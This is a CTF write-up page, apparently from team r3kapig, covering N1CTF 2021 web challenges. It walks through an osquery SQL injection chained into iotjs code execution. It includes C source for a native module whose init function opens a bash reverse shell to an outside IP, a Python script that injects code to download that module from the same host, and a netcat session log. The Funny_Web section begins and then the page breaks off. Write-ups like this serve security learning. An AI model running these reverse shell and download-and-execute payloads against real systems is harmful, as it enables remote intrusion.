@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>N1CTF 2021 Writeup (Web) | r3kapig</title>
+    <meta property="og:title" content="r3kapig writeup" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="Writeup for N1CTF 2021 Writeup (Web)" />
+    <meta property="og:description" content="Writeup for N1CTF 2021 Writeup (Web)" />
+    <link rel="canonical" href="https://r3kapig.com/writeup/" />
+    <meta property="og:url" content="https://r3kapig.com/writeup/" />
+    <meta property="og:site_name" content="r3kapig" />
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      min-height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      min-height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="../">
+        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">r3kapig / writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                introduction
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#qqqueryyy-all-the-things">qqqueryyy-all-the-things</a>
+    
+                <a class="dropdown-item" href="#funny_web">funny_web</a>
+    
+                <a class="dropdown-item" href="#easyphp">easyphp</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
+        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">introduction</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#qqqueryyy-all-the-things" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">qqqueryyy-all-the-things</span>
+            </a>
+    
+<a href="#funny_web" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">funny_web</span>
+            </a>
+    
+<a href="#easyphp" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">easyphp</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="n1ctf-2021-writeup-web"><a class="header-link" href="#n1ctf-2021-writeup-web"></a>N1CTF 2021 Writeup (Web)</h1>
+<p>Originally from <a href="https://harold.kim/blog/2021/11/n1ctf-writeup/">https://harold.kim/blog/2021/11/n1ctf-writeup/</a>.</p>
+<h2 id="introduction"><a class="header-link" href="#introduction"></a>Introduction</h2>
+<p>I wasn&#39;t playing CTFs for almost a year due to my health conditions that has been causing me some troubles for a year now.</p>
+<p>I also lost some interest in solving CTF challenges during the COVID outbreak... Fortunately, my teammates are really talented enough to break down most challenges so I don&#39;t get that motivated to solve any CTF challenges right now.</p>
+<p>Since I was asked for an help on web challenges this time, I decided to check out some challenges.</p>
+<h2 id="web"><a class="header-link" href="#web"></a>web</h2>
+<h3 id="qqqueryyy-all-the-things"><a class="header-link" href="#qqqueryyy-all-the-things"></a>QQQueryyy All The Things</h3>
+<blockquote>
+<p>Do you like Be----lla？</p>
+<p>China Mainland: <a href="http://47.57.246.66:12321/?str=world">http://47.57.246.66:12321/?str=world</a></p>
+<p>Others: <a href="http://8.218.140.54:12321/?str=world">http://8.218.140.54:12321/?str=world</a></p>
+</blockquote>
+<p>Unfortunately we couldn&#39;t get any source-code for this challenge, but it was obvious to see that SQL injection exists.</p>
+<img src=//harold.kim/static/blog/n1ctf-web-1.png>
+
+<p>Looking down a bit, we found that it&#39;s something to do with the SQLite.</p>
+<img src=//harold.kim/static/blog/n1ctf-web-2.png>
+
+<p>By doing <code>SELECT * FROM sqlite_temp_schema</code> we can see some hidden tables that were not available from <code>sqlite_master</code>.</p>
+<p>After some Google searches with the names from the table list, we can see that this is a database tool by (<a href="https://osquery.io/">https://osquery.io/</a>)</p>
+<img src=//harold.kim/static/blog/n1ctf-web-3.png>
+
+<p>Later, we also found out that we can possibly read some of running processes within the server.</p>
+<img src=//harold.kim/static/blog/n1ctf-web-4.png>
+
+<p>My teammate built a script and sent me some interesting logs of how others were exploiting.</p>
+<pre class="hljs"><code>...
+  {<span class="hljs-attr">&quot;cmdline&quot;</span>:<span class="hljs-string">&quot;tail -f /var/log/apache2/access.log&quot;</span>},
+  {<span class="hljs-attr">&quot;cmdline&quot;</span>:<span class="hljs-string">&quot;sh -c echo &#x27;SELECT &#x27;\\&#x27;&#x27;1&#x27;\\&#x27;&#x27;;select * from curl where url=&#x27;\\&#x27;&#x27;http://127.0.0.1:16324&#x27;\\&#x27;&#x27; and user_agent=&#x27;\\&#x27;&#x27;\n\n\n\n\n\n\n\n\n\n\n\n\n\nvar chunk=new Buffer(\&quot;\\x50\\xe5\\x74\\x64\\x04\\x00\\x00\\x00\\xb4\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\xb4\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\xb4\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x3c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x3c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x51\\xe5\\x74\\x64\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x52\\xe5\\x74\\x64\\x04\\x00\\x00\\x00\\xf8\\x2d\\x00\\x00\\x00\\x00\\x00\\x00\\xf8\\x3d\\x00\\x00\\x00\\x00\\x00\\x00\\xf8\\x3d\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x47\\x4e\\x55\\x00\\x02\\x00\\x00\\xc0\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x47\\x4e\\x55\\x00\\xa9\\x1c\\xaf\\xac\\xe6\\x44\\xfe\\x91\\xc4\\x75\\x0b\\xb6\\xcf\\xf5\\xb3\\xb3\\xc7\\x04\\xe3\\x77\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x20\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\xfd\\x9b\\xbc\\xdc\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xb0\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x5c\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x7b\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x00\\x00\\x00\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x99\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x63\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\&quot;);var glzjins_girlfriend=require(\&quot;fs\&quot;).openSync(\&quot;/tmp/zglzjin_girlfriend4.node\&quot;,\&quot;a\&quot;);require(\&quot;fs\&quot;).writeSync(glzjins_girlfriend, chunk, 0, chunk.length);\n\n\n\n\n\n\n\n\n\n\n//&#x27;\\&#x27;&#x27;;select &#x27;\\&#x27;&#x27;sqlmap&#x27;\\&#x27;&#x27; as hello;&#x27; | osqueryi --json&quot;</span>},
+  {<span class="hljs-attr">&quot;cmdline&quot;</span>:<span class="hljs-string">&quot;osqueryi --json&quot;</span>},
+  {<span class="hljs-attr">&quot;cmdline&quot;</span>:<span class="hljs-string">&quot;/src/iotjs/build/x86_64-linux/debug/bin/iotjs /src/iotjs/tools/repl.js&quot;</span>},
+  {<span class="hljs-attr">&quot;cmdline&quot;</span>:<span class="hljs-string">&quot;sh -c echo &#x27;SELECT &#x27;\\&#x27;&#x27;world&#x27;\\&#x27;&#x27;;select cmdline from processes;--&#x27;\\&#x27;&#x27; as hello;&#x27; | osqueryi --json&quot;</span>},
+  {<span class="hljs-attr">&quot;cmdline&quot;</span>:<span class="hljs-string">&quot;osqueryi --json&quot;</span>}
+...</code></pre><p>.. and this was where my teammates were stuck. They asked for an help so I decided to take a few more steps to solve the challenge.</p>
+<p>From this payload we know that</p>
+<ol class="list">
+<li>There is some bug in <code>curl</code> table where we can write arbitrary header packets.</li>
+<li><code>http://127.0.0.1:16324</code> runs <code>repl.js</code> from iotjs (<a href="https://github.com/jerryscript-project/iotjs">https://github.com/jerryscript-project/iotjs</a>)</li>
+<li>The attacker has uploaded some interesting binary data, so I assumed that it may be possible to upload some native modules for iotjs.</li>
+</ol>
+<p>From here, all you need is to carefully read the official documentation of iotjs and build your native module by using <code>node-gyp</code>.</p>
+<ul class="list">
+<li><a href="https://github.com/jerryscript-project/iotjs/blob/master/docs/devs/Writing-New-Module.md">https://github.com/jerryscript-project/iotjs/blob/master/docs/devs/Writing-New-Module.md</a></li>
+<li><a href="https://github.com/jerryscript-project/iotjs/blob/master/docs/api/IoT.js-API-N-API.md">https://github.com/jerryscript-project/iotjs/blob/master/docs/api/IoT.js-API-N-API.md</a></li>
+</ul>
+<pre class="hljs"><code>root@stypr-jpn:~/aaa/iotjs/# npm i -g node-gyp
+root@stypr-jpn:~/aaa/iotjs/# python ./iotjs/tools/iotjs-create-module.py --template shared v
+... (Some setups from guide) ...
+root@stypr-jpn:~/aaa/iotjs/v/src# vi module_entry.c
+root@stypr-jpn:~/aaa/iotjs/v/src# cat module_entry.c 
+<span class="hljs-meta">#</span><span class="bash">include &lt;node_api.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span>
+<span class="hljs-meta">#</span><span class="bash">include &lt;execinfo.h&gt;</span>
+
+static napi_value hello_world(napi_env env, napi_callback_info info) {
+  napi_value world;
+  const char* str = &quot;Hello world!&quot;;
+  size_t str_len = strlen(str);
+  if (napi_create_string_utf8(env, str, str_len, &amp;world) != napi_ok)
+    return NULL;
+  return world;
+}
+
+napi_value init_v(napi_env env, napi_value exports) {
+  napi_property_descriptor desc = { &quot;hello&quot;, 0, hello_world,  0,
+                                    0,       0, napi_default, 0 };
+  system(&quot;rm -rf /tmp/styp.node; bash -i &gt;&amp; /dev/tcp/158.101.144.10/12345 0&gt;&amp;1&quot;);
+  if (napi_define_properties(env, exports, 1, &amp;desc) != napi_ok)
+    return NULL;
+
+  return exports;
+}
+
+root@stypr-jpn:~/aaa/iotjs/v# node-gyp configure
+...
+root@stypr-jpn:~/aaa/iotjs/v# node-gyp build
+gyp info it worked if it ends with ok
+gyp info using node-gyp@8.4.0
+gyp info using node@14.18.1 | linux | x64
+make: Entering directory &#x27;/root/aaa/iotjs/v/build&#x27;
+gyp info spawn make
+gyp info spawn args [ &#x27;BUILDTYPE=Release&#x27;, &#x27;-C&#x27;, &#x27;build&#x27; ]
+  CC(target) Release/obj.target/v/src/module_entry.o
+../src/module_entry.c: In function ‘init_v’:
+../src/module_entry.c:19:3: warning: ignoring return value of ‘system’, declared with attribute warn_unused_result [-Wunused-result]
+   system(&quot;rm -rf /tmp/styp.node; bash -i &gt;&amp; /dev/tcp/158.101.144.10/12345 0&gt;&amp;1&quot;);
+   ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  SOLINK_MODULE(target) Release/obj.target/v.node
+  COPY Release/v.node
+root@stypr-jpn:~/aaa/iotjs/v/build/Release# ls -al
+total 28
+drwxr-xr-x 4 root root 4096 Nov 21 01:54 .
+drwxr-xr-x 3 root root 4096 Nov 21 01:23 ..
+drwxr-xr-x 3 root root 4096 Nov 21 01:32 .deps
+drwxr-xr-x 3 root root 4096 Nov 21 01:54 obj.target
+-rwxr-xr-x 2 root root 8336 Nov 21 01:54 v.node</code></pre><p>Now, with the created <code>v.node</code> file, you can now create an exploit code to upload <code>v.node</code> file to the server and let the arbitrary code execute in remote.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-comment">#-*- coding: utf-8 -*-</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> base64
+
+
+<span class="hljs-comment"># SQL Injection</span>
+url = <span class="hljs-string">&quot;http://47.57.246.66:12321/?str=world&#x27;;{};--&quot;</span>
+<span class="hljs-comment"># Payload from other team</span>
+payload = <span class="hljs-string">&quot;select group_concat(result)from curl where url=&#x27;http://127.0.0.1:16324&#x27; and user_agent=&#x27;\n\n\n\n\n\n\n\n\n\n\n\n\n\n{node}\n\n\n\n\n\n\n\n\n\n\n&#x27;&quot;</span>
+
+
+<span class="hljs-string">&quot;&quot;&quot;
+Write native module to server
+
+fs = require(&quot;fs&quot;);
+http = require(&quot;http&quot;)
+
+f = fs.openSync(&quot;/tmp/styp.node&quot;, &quot;w&quot;)
+http.get({
+    host: &quot;158.101.144.10&quot;,
+    port: 80,
+    path: &quot;/styp.node?exp&quot;
+}, function(resp){
+    resp.on(&quot;data&quot;, function(exploit){
+        fs.writeSync(f, exploit, 0, exploit.length)
+    });
+    resp.on(&quot;end&quot;, function(){
+        fs.closeSync(f)
+        process.exit(1)
+    });
+});
+&quot;&quot;&quot;</span>
+gadget_init = <span class="hljs-string">&quot;fs=require(\&quot;fs\&quot;);f=fs.openSync(\&quot;/tmp/styp.node\&quot;,\&quot;w\&quot;);http=require(\&quot;http\&quot;);http.get({ host:\&quot;158.101.144.10\&quot;,port:80,path:\&quot;/styp.node?q\&quot;},function(r){r.on(\&quot;data\&quot;,function(c){fs.writeSync(f, nc, 0, c.length);});r.on(\&quot;end\&quot;, function(){fs.closeSync(f);process.exit(1);})});&quot;</span>
+payload_init = payload.<span class="hljs-built_in">format</span>(node=gadget_init)
+
+r = requests.get(url.<span class="hljs-built_in">format</span>(payload_init))
+<span class="hljs-built_in">print</span>(r.text)
+
+<span class="hljs-string">&quot;&quot;&quot;
+Run my native module
+
+sty = require(&quot;/tmp/styp.node&quot;)
+console.log(sty)
+&quot;&quot;&quot;</span>
+gadget_shell = <span class="hljs-string">&quot;sty=require(\&quot;/tmp/styp.node\&quot;);console.log(sty);&quot;</span>
+payload_shell = payload.<span class="hljs-built_in">format</span>(node=gadget_shell)
+
+r = requests.get(url.<span class="hljs-built_in">format</span>(payload_shell))
+<span class="hljs-built_in">print</span>(r.text)
+</code></pre><p>With this, you can easily get the system shell in the remote server.</p>
+<p>However, the challenge author has set <code>alarm()</code> on <code>/readflag</code> to prevent any unexpected solutions, so I had to write some custom python code to automate the <code>/readflag</code> stdin to retrieve the flag.</p>
+<pre class="hljs"><code>root@stypr-jpn:/tmp# nc -vlp 12345
+Listening on [0.0.0.0] (family 0, port 12345)
+Connection from 8.218.140.54 43570 received!
+bash: cannot set terminal process group (165270): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+ctf@cb449efe1f34:/$  python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;
+ python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;
+bash: /root/.bashrc: Permission denied
+ctf@cb449efe1f34:/$ cd /
+cd /
+ctf@cb449efe1f34:/$ ls -la
+ls -la
+total 456
+drwxr-xr-x   1 root root   4096 Nov 19 15:13 .
+drwxr-xr-x   1 root root   4096 Nov 19 15:13 ..
+-rwxr-xr-x   1 root root      0 Nov  7 21:45 .dockerenv
+drwxr-xr-x   1 root root   4096 Nov 19 15:15 bin
+drwxr-xr-x   2 root root   4096 Apr 24  2018 boot
+drwxr-xr-x   5 root root    340 Nov 20 22:10 dev
+drwxr-xr-x   1 root root   4096 Nov  7 21:45 etc
+-r-x------   1 root root     71 Nov  7 21:03 flag
+drwxr-xr-x   1 root root   4096 Nov  7 21:42 home
+drwxr-xr-x   1 root root   4096 Nov  7 21:40 lib
+drwxr-xr-x   2 root root   4096 Nov  7 21:40 lib32
+drwxr-xr-x   2 root root   4096 Sep 30 20:33 lib64
+drwxr-xr-x   2 root root   4096 Sep 30 20:32 media
+drwxr-xr-x   2 root root   4096 Sep 30 20:32 mnt
+drwxr-xr-x   1 root root   4096 Nov  7 21:40 opt
+dr-xr-xr-x 195 root root      0 Nov 20 22:10 proc
+-r-sr-xr-x   1 root root  13144 Nov  7 18:23 readflag
+drwx------   1 root root   4096 Nov 21 01:02 root
+drwxr-xr-x   1 root root   4096 Nov 20 22:10 run
+drwxr-xr-x   1 root root   4096 Nov  8 14:24 sbin
+dr-xr-xr-x   1 root root   4096 Nov  7 21:42 src
+drwxr-xr-x   2 root root   4096 Sep 30 20:32 srv
+dr-xr-xr-x  13 root root      0 Nov 20 23:16 sys
+drwxrwxrwt   1 root root 348160 Nov 21 01:29 tmp
+drwxr-xr-x   1 root root   4096 Nov  7 21:40 usr
+drwxr-xr-x   1 root root   4096 Nov  7 21:41 var
+ctf@cb449efe1f34:/$ python -c &#x27;from subprocess import Popen, PIPE, STDOUT;p=Popen([&quot;/readflag&quot;], stdout=PIPE, stdin=PIPE, stderr=STDOUT);print(p.stdout.readline());ans=str(eval(p.stdout.readline().strip()));print(ans);p.stdin.write(ans+&quot;\n&quot;);print(p.stdout.readline());print(p.stdout.readline());print(p.stdout.readline());&#x27;
+&lt;t(p.stdout.readline());print(p.stdout.readline());&#x27;
+Solve the easy challenge first
+
+-2542215
+input your answer: ok! here is your flag!!
+
+n1ctf{3894619c1b94abe1df7fa7948fa5028a5eba3b98408624ebc02163ad72382c39}
+
+ctf@cb449efe1f34:/$ </code></pre><h3 id="funny_web"><a class="header-link" href="#funny_web"></a>Funny_Web</h3>
+<blockquote>
+<p>1: 1.13.194.226</p>
+<p>2: 129.226.12.144</p>
+<p>hint1-The web server is not running on docker</p>
+</blockquote>
+<p>I think this was one of the interesting yet tedious challenge to solve.</p>
+<p>The vulnerability itself is interesting and simple, but it took some time to write the exploit for this challenge.</p>
+<p>We get the service&#39;s sourcecode upon accessing the page.</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+session_start();
+<span class="hljs-comment">//hint in /hint.txt</span>
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;url&quot;</span>])) {
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uuid</span>(<span class="hljs-params"></span>)
+</span>{
+    <span class="hljs-variable">$chars</span> = md5(uniqid(mt_rand(), <span class="hljs-literal">true</span>));
+    <span class="hljs-variable">$uuid</span> = substr(<span class="hljs-variable">$chars</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>) . <span class="hljs-string">&#x27;-&#x27;</span>
+        . substr(<span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>) . <span class="hljs-string">&#x27;-&#x27;</span>
+        . substr(<span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>) . <span class="hljs-string">&#x27;-&#x27;</span>
+        . substr(<span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span>) . <span class="hljs-string">&#x27;-&#x27;</span>
+        . substr(<span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid</span>;
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)
+</span>{
+    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;/l|g|[\x01-\x1f]|[\x7f-\xff]|[&#x27;\&quot;]/i&quot;</span>;
+
+    <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$url</span>)
+        &amp;&amp; strlen(<span class="hljs-variable">$url</span>) &lt; <span class="hljs-number">4096</span>
+        &amp;&amp; !preg_match(<span class="hljs-variable">$blacklist</span>, <span class="hljs-variable">$url</span>)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+}
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;uuid&quot;</span>])) {
+    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;uuid&quot;</span>] = uuid();
+}
+
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;uuid&quot;</span>].<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
+
+<span class="hljs-keyword">if</span> (Check(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;url&quot;</span>])) {
+    <span class="hljs-variable">$url</span> = escapeshellarg(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;url&quot;</span>]);
+    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;/usr/bin/curl ${url} --output - -m 3 --connect-timeout 3&quot;</span>;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your command: &quot;</span> . <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
+    <span class="hljs-variable">$res</span> = shell_exec(<span class="hljs-variable">$cmd</span>);
+} <span class="hljs-keyword">else</span> {
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error~&quot;</span>);
+}
+
+<span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$res</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;uuid&quot;</span>]) !== <span class="hljs-literal">false</span>) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;
+} <span class="hljs-keyword">else</span> {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you cannot get the result~&quot;</span>;
+}
+</code></pre><p>After testing for 30 minutes, My teammate <a href="https://twitter.com/CurseRed">@CurseRed</a> brought me some ideas to bypass the method.</p>
+<p>If you look at the topmost of the curl&#39;s official manpage (<a href="https://curl.se/docs/manpage.html">https://curl.se/docs/manpage.html</a>), we see something like the following.</p>
+<pre class="hljs"><code>The <span class="hljs-built_in">URL</span> syntax is protocol-dependent. You find <span class="hljs-keyword">a</span> <span class="hljs-keyword">detailed</span> description <span class="hljs-keyword">in</span> RFC <span class="hljs-number">3986.</span>
+
